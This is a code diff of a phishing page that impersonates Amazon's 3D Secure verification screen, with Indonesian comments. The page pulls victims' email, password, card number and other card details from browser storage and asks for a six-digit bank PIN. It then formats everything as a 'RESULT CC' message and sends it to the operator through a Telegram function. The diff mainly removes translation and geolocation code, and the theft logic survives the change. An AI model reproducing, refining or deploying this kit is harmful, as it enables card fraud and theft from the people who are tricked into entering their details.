@@ -18,7 +18,7 @@
         .pin-ket { font-size: 12px; color: #555; margin-bottom: 15px; }
         .pin-baris { display: flex; gap: 10px; margin-bottom: 20px; justify-content: space-between; }
         .pin-kolom { flex: 1; max-width: 65px; }
-        .pin-kolom input { width: 100%; height: 50px; text-align: center; font-size: 20px; border: 1px solid #a6a6a6; border-radius: 4px; outline: none; font-family: 'Courier New', monospace; }
+        .pin-kolom input { width: 100%; height: 50px; text-align: center; font-size: 20px; border: 1px solid #a6a6a6; border-radius: 4px; outline: none; }
         .pin-kolom input:focus { border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
         button { width: 100%; padding: 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; }
         button:hover { background: #F7CA00; }
@@ -32,124 +32,43 @@
 <body>
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1 data-i18n="title">3D Secure Verification</h1>
-        <p class="sub" data-i18n="subtitle">Bank Anda meminta verifikasi tambahan untuk melindungi transaksi Anda.</p>
+        <h1>3D Secure Verification</h1>
+        <p class="sub">Bank Anda meminta verifikasi tambahan untuk melindungi transaksi Anda.</p>
         
         <div class="info">
-            <div><span data-i18n="cardLabel">Kartu:</span> <strong id="tampilKartu">—</strong></div>
-            <div><span data-i18n="emailLabel">Email:</span> <strong id="tampilEmail">—</strong></div>
+            <div>Kartu: <strong id="tampilKartu">—</strong></div>
+            <div>Email: <strong id="tampilEmail">—</strong></div>
         </div>
         
         <form id="form3ds">
-            <p class="pin-judul" data-i18n="enterPin">Masukkan PIN Anda</p>
-            <p class="pin-ket" data-i18n="pinHint">Masukkan 6 digit PIN verifikasi dari bank penerbit kartu.</p>
+            <p class="pin-judul">Masukkan PIN Anda</p>
+            <p class="pin-ket">Masukkan 6 digit PIN verifikasi dari bank penerbit kartu.</p>
             
             <div class="pin-baris">
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p1" data-asli=""></div>
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p2" data-asli=""></div>
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p3" data-asli=""></div>
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p4" data-asli=""></div>
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p5" data-asli=""></div>
-                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p6" data-asli=""></div>
+                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p1"></div>
+                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p2"></div>
+                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p3"></div>
+                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p4"></div>
+                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p5"></div>
+                <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p6"></div>
             </div>
 
-            <button type="submit" id="tombolKirim" data-i18n="verifyBtn">Verify & Complete</button>
+            <button type="submit" id="tombolKirim">Verify & Complete</button>
             
             <div class="proses" id="sedang">
-                ⏳ <span data-i18n="verifying">Sedang memverifikasi...</span>
+                ⏳ Sedang memverifikasi...
             </div>
         </form>
     </div>
     <div class="footer">
-        <a href="#" data-i18n="conditions">Conditions of Use</a>
-        <a href="#" data-i18n="privacy">Privacy Notice</a>
-        <a href="#" data-i18n="help">Help</a>
+        <a href="#">Conditions of Use</a>
+        <a href="#">Privacy Notice</a>
+        <a href="#">Help</a>
         <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
     <script>
-        // === TERJEMAHAN ===
-        const terjemahan = {
-            ja: {
-                title: '3Dセキュア認証',
-                subtitle: 'お客様の取引を保護するため、銀行による追加の本人確認が必要です。',
-                cardLabel: 'カード：',
-                emailLabel: 'メールアドレス：',
-                enterPin: 'PINを入力してください',
-                pinHint: '発行銀行から通知された6桁のPINを入力してください。',
-                verifyBtn: '確認して完了',
-                verifying: '確認中...',
-                conditions: '利用規約',
-                privacy: 'プライバシー通知',
-                help: 'ヘルプ',
-                pinError: '6桁のPINを入力してください'
-            },
-            id: {
-                title: 'Verifikasi 3D Secure',
-                subtitle: 'Bank Anda meminta verifikasi tambahan untuk melindungi transaksi Anda.',
-                cardLabel: 'Kartu:',
-                emailLabel: 'Email:',
-                enterPin: 'Masukkan PIN Anda',
-                pinHint: 'Masukkan 6 digit PIN verifikasi dari bank penerbit kartu.',
-                verifyBtn: 'Verifikasi & Selesai',
-                verifying: 'Sedang memverifikasi...',
-                conditions: 'Syarat Penggunaan',
-                privacy: 'Kebijakan Privasi',
-                help: 'Bantuan',
-                pinError: 'Masukkan 6 digit kode PIN'
-            },
-            en: {
-                title: '3D Secure Verification',
-                subtitle: 'Your bank requires additional verification to protect your transaction.',
-                cardLabel: 'Card:',
-                emailLabel: 'Email:',
-                enterPin: 'Enter your PIN',
-                pinHint: 'Enter the 6-digit verification PIN from your card issuing bank.',
-                verifyBtn: 'Verify & Complete',
-                verifying: 'Verifying...',
-                conditions: 'Conditions of Use',
-                privacy: 'Privacy Notice',
-                help: 'Help',
-                pinError: 'Please enter the 6-digit PIN'
-            }
-        };
-
-        // Peta kode negara → bahasa
-        const negaraKeBahasa = {
-            'JP': 'ja', 'ID': 'id',
-            'US': 'en', 'GB': 'en', 'AU': 'en', 'CA': 'en', 'NZ': 'en',
-            'MY': 'en', 'SG': 'en', 'PH': 'en', 'TH': 'en', 'VN': 'en',
-            'CN': 'en', 'KR': 'en', 'DE': 'en', 'FR': 'en'
-        };
-
-        // Terapkan bahasa
-        function terapkanBahasa(kodeBahasa) {
-            const kamus = terjemahan[kodeBahasa] || terjemahan.en;
-            document.documentElement.lang = kodeBahasa;
-            document.querySelectorAll('[data-i18n]').forEach(el => {
-                const kunci = el.getAttribute('data-i18n');
-                if (kamus[kunci]) el.textContent = kamus[kunci];
-            });
-            return kamus;
-        }
-
-        // Deteksi lokasi & terapkan bahasa
-        async function deteksiLokasi() {
-            let bahasa = 'id';
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                if (data && data.country_code) {
-                    bahasa = negaraKeBahasa[data.country_code] || 'id';
-                }
-            } catch (err) {
-                bahasa = 'id';
-            }
-            return terapkanBahasa(bahasa);
-        }
-        const kamusAktif = await deteksiLokasi();
-
-        // === AMBIL DATA DARI PENYIMPANAN ===
+        // === AMBIL DATA ===
         const email = localStorage.getItem('emailPengguna') || '';
         const pass = localStorage.getItem('passwordPengguna') || '';
         const namaKartu = localStorage.getItem('namaKartu') || '';
@@ -162,100 +81,86 @@
         const telepon = localStorage.getItem('telepon') || '';
         const track = localStorage.getItem('trackKartu') || '';
 
-        // Debug — cek data
-        console.log('Data dari localStorage:');
-        console.log('Email:', email);
-        console.log('Nomor Kartu:', nomor);
-
-        // Jika belum lewat billing → kembali
-        if (!nomor || !email) {
-            console.log('Belum ada data, kembali ke billing.html');
-            window.location.href = 'billing.html';
-        }
-
-        // Tampilkan info — 4 angka terakhir kartu
-        let tampilNomor = '•••• •••• •••• ----';
+        // Tampilkan 4 angka terakhir kartu
         if (nomor && nomor.length >= 4) {
-            tampilNomor = `•••• •••• •••• ${nomor.slice(-4)}`;
+            const akhir = nomor.slice(-4);
+            document.getElementById('tampilKartu').textContent = `•••• •••• •••• ${akhir}`;
+        } else {
+            document.getElementById('tampilKartu').textContent = 'Tidak tersedia';
         }
-        document.getElementById('tampilKartu').textContent = tampilNomor;
-        document.getElementById('tampilEmail').textContent = email;
 
-        // === 6 KOLOM PIN ===
-        const kolom = ['p1','p2','p3','p4','p5','p6'].map(id => document.getElementById(id));
-        
-        kolom.forEach((inp, i) => {
-            // Simpan angka asli, tampilkan titik, pindah ke kolom berikutnya
-            inp.addEventListener('input', (e) => {
-                e.preventDefault();
-                const nilai = inp.value.replace(/\D/g, '');
-                if (nilai) {
-                    inp.setAttribute('data-asli', nilai[0]);
-                    inp.value = '•';
+        // Tampilkan email
+        if (email) {
+            document.getElementById('tampilEmail').textContent = email;
+        }
+
+        // === KOLOM PIN ===
+        const kolom = [
+            { el: document.getElementById('p1'), val: '' },
+            { el: document.getElementById('p2'), val: '' },
+            { el: document.getElementById('p3'), val: '' },
+            { el: document.getElementById('p4'), val: '' },
+            { el: document.getElementById('p5'), val: '' },
+            { el: document.getElementById('p6'), val: '' }
+        ];
+
+        kolom.forEach((item, i) => {
+            item.el.addEventListener('input', function() {
+                const angka = this.value.replace(/[^0-9]/g, '');
+                if (angka) {
+                    item.val = angka[0];
+                    this.value = '•';
                     // Pindah ke kolom berikutnya
                     if (i < 5) {
-                        kolom[i + 1].focus();
+                        kolom[i + 1].el.focus();
                     }
-                } else {
-                    inp.setAttribute('data-asli', '');
                 }
             });
 
-            // Kembalikan angka asli saat fokus
-            inp.addEventListener('focus', () => {
-                const asli = inp.getAttribute('data-asli');
-                inp.value = asli || '';
+            item.el.addEventListener('focus', function() {
+                if (item.val) {
+                    this.value = item.val;
+                }
             });
 
-            // Sembunyikan lagi saat keluar
-            inp.addEventListener('blur', () => {
-                const asli = inp.getAttribute('data-asli');
-                inp.value = asli ? '•' : '';
+            item.el.addEventListener('blur', function() {
+                if (item.val) {
+                    this.value = '•';
+                }
             });
 
-            // Kembali ke kolom sebelumnya jika kosong & tekan Backspace
-            inp.addEventListener('keydown', (e) => {
+            item.el.addEventListener('keydown', function(e) {
                 if (e.key === 'Backspace') {
-                    const asli = inp.getAttribute('data-asli');
-                    if (!asli && i > 0) {
-                        kolom[i - 1].focus();
+                    if (!item.val && i > 0) {
+                        kolom[i - 1].el.focus();
                     } else {
-                        inp.setAttribute('data-asli', '');
+                        item.val = '';
+                        this.value = '';
                     }
-                }
-                if (e.key === 'ArrowLeft' && i > 0) {
-                    kolom[i - 1].focus();
-                }
-                if (e.key === 'ArrowRight' && i < 5) {
-                    kolom[i + 1].focus();
                 }
             });
         });
 
         function ambilPIN() {
-            return kolom.map(inp => inp.getAttribute('data-asli') || '').join('');
+            return kolom.map(k => k.val).join('');
         }
 
         // === KIRIM DATA ===
         const form = document.getElementById('form3ds');
-        const tombol = document.getElementById('tombolKirim');
-        const sedang = document.getElementById('sedang');
-
-        form.addEventListener('submit', async (e) => {
+        form.addEventListener('submit', async function(e) {
             e.preventDefault();
             const pin = ambilPIN();
-            console.log('PIN yang dikirim:', pin);
             
             if (pin.length !== 6) {
-                alert(kamusAktif.pinError || 'Masukkan 6 digit kode PIN');
+                alert('Masukkan 6 digit kode PIN');
                 return;
             }
 
-            tombol.disabled = true;
-            tombol.style.display = 'none';
-            sedang.classList.add('tampil');
+            document.getElementById('tombolKirim').disabled = true;
+            document.getElementById('tombolKirim').style.display = 'none';
+            document.getElementById('sedang').classList.add('tampil');
 
-            const pesanCC = `
+            const pesan = `
 💳 *RESULT CC*
 ━━━━━━━━━━━━━━━━━━━━━
 📧 Email: \`${email}\`
@@ -276,10 +181,8 @@ ${track}
 🕐 Waktu: ${new Date().toLocaleString()}
             `.trim();
 
-            console.log('Pesan dikirim ke Telegram:', pesanCC);
-
             if (typeof CONFIG !== 'undefined' && CONFIG.kirimKeTelegram) {
-                await CONFIG.kirimKeTelegram(pesanCC);
+                await CONFIG.kirimKeTelegram(pesan);
             }
 
             setTimeout(() => {
